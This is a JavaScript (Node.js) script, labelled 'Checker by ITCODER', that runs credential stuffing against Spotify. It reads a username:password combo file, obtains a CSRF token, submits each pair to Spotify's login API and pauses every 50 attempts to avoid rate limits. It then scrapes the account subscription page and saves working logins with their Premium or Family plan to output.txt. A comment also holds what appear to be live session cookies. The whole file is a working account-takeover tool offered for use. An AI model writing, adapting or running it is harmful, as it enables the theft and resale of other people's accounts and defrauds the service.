const request = require("request");
const cheerio = require('cheerio');
const clc = require('cli-color');
const LineByLineReader = require('line-by-line');
var lineReader = require('line-reader');
var fs = require('fs');
var sleep = require('system-sleep');
let crf_token
let cookie
let username,password
var i = 0
var readline = require('readline-sync');
process.title = "Checker by ITCODER";
var combo = readline.question("EnterNumber file Combo(.txt):");
if(!combo.indexOf('.txt')){
	
	process.exit()
}
lineReader.eachLine(combo, function(line) {
//
//lr.pause();
username = line.split(':')[0]
password = line.split(':')[1]

  //console.log(i)

 get_login(username,password)
 if(i == 50){
	sleep(15000)
	i=0
	
 }
 i++
});

//csrf_token=AQAO2s1lL5jWjrjD6bQTZQlnLLIuMa8CHkT8Hu_fCN13KWHQoYYrGSP726hCW9Gft06lgHJgS1OVfF8; sp_ac=AQCGRigLdCG6NnCfLNuMOrFQtCS3WPm-q1ukNlbQS_BDXuBGIjvs7nIybDg_KvTcsRc-2cm0Qpn_IQlzJCOfLP96347llKUGtsG7M6PkHB-oWIsvEnb7q5ezHMviY4E1siD28AG_bUwT-nAXk7h-HIpOK3q_SdxrgjgKvTsYbJT_0CeJlyAM1FY5FCPsbRzDeZ3gjK_3cFCJKsT0EXog0XwJAD0bcXXEPGM; sp_dc=AQCzOhShEb4Zx8kpsG9PimMTJ-jFkTHCn4PDP2drO-GYEFiko3wdWDLTdEOn_ktgakJkqdFsU_2VteYNJbS0BwlEdVMAXo-dta73hliE-A; sp_key=c5b2b507-6db0-45f1-9d12-8de8dd99d4de
function get_login(username,password) {
	
    var options1 = {
        method: 'GET',
        url: 'https://accounts.spotify.com/en/login/',

    };
    request(options1, function(error, response, body) {
        if (error) throw new Error(error);
        crf_token = response.headers['set-cookie'][0] //get cookie crf_token
        crf_token = crf_token.split('=')
        crf_token = crf_token[1]
        crf_token = crf_token.split(';')
        crf_token = crf_token[0]
        //console.log(crf_token);
        var options2 = {
            method: 'POST',
            url: 'https://accounts.spotify.com/api/login',
            headers: {
                'cookie': 'csrf_token=' + crf_token + ';__bon=MHwwfDEyMDI2MzkyMTd8NTA1MTA4NDcxMTR8MXwxfDF8MQ==;',
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'accounts.spotify.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
                origin: 'https://accounts.spotify.com',
                accept: 'application/json, text/plain, */*'
            },
            form: {
                'username':username ,
                'password':password,
                'remember': true,
                'csrf_token': crf_token
            }
        };




        request(options2, function(error, response, body) {
            if (error) throw new Error(error);
			var obj = JSON.parse(body)
			//console.log(obj)
			if(!obj['error']){
			
            cookie = response.headers['set-cookie']
            //console.log(cookie);
            var options3 = {
                rejectUnauthorized: false,
                method: 'GET',
                url: 'https://www.spotify.com/us/account/subscription/',
				headers: { 'cookie':cookie,
				           'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
				}

            };
            request(options3, function(error, response, body) {
                //console.log(response.headers['set-cookie']);
				$ = cheerio.load(body);
				  var res = $("h3").eq(0)
				  var exp = $("b").eq(0)
				  if(res.text() == 'Spotify Premium'){

					  console.log(clc.red('-----------------------Premium-----------------------'));
					  console.log(clc.green('stats:'+res.text()));
					  console.log(clc.green('renew:'+exp.text()));
					  console.log(clc.red('-----------------------------------------------------'));
					  fs.appendFileSync("output.txt", username+":"+password + "|plane:"+res.text()+"|renew:"+exp.text()+"\n");
					  
				  }else{

					  if(res.text() == 'Spotify Premium Family'){
					  console.log(clc.red('---------------Spotify Premium Family----------------'));
					  console.log(clc.blue('stats:'+res.text()));
					  console.log(clc.blue('renew:'+exp.text()));
					  console.log(clc.red('-----------------------------------------------------'));
					  fs.appendFileSync("output.txt", username+":"+password + "|plane:"+res.text()+"|renew:"+exp.text()+"\n");
					  }else{

					  console.log(clc.red('---------------------------Free----------------------'));
					  console.log(clc.blue('stats:'+res.text()));
					  console.log(clc.red('-----------------------------------------------------'));
					  fs.appendFileSync("output.txt", username+":"+password + "|plane:"+res.text()+"|renew:"+exp.text()+"\n");
						  
					  }
					  
				  }

            });
		}else{
			
			console.log(clc.red('Login Fail'))
		
		}


        });




    });
}